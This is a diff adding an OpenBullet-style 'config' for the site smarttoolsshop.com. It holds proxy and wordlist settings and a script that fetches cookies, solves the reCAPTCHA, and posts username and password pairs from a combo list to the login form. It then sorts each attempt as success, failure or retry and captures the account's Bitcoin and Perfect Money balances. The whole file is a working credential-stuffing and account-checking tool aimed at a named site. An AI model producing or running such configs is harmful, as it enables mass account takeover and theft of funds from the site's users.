@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "SmartToolsShop",
+  "SuggestedBots": 20,
+  "LastModified": "2018-06-05T16:38:48.1174585+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Getting_Cookies REQUEST GET "https://www.smarttoolsshop.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://www.smarttoolsshop.com" "6LfuajoUAAAAAMBTrytwQJUlK4SMm6jB3RWl5QsE" -> VAR "RECAP" 
+#Login REQUEST POST "https://www.smarttoolsshop.com/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>&login=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "Wrong Captcha!" 
+  KEYCHAIN Success OR 
+    KEY ">Sign out<" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong username or password" 
+#BTCBALANCE PARSE "<SOURCE>" LR "fa-bitcoin\"></i>" "</li>" Recursive=FALSE -> CAP "BTC Balance" "" "" 
+#PMBALANCE PARSE "<SOURCE>" LR "fa-dollar\"></i>" "</li>" Recursive=FALSE -> CAP "PM Balance" "$" "" 
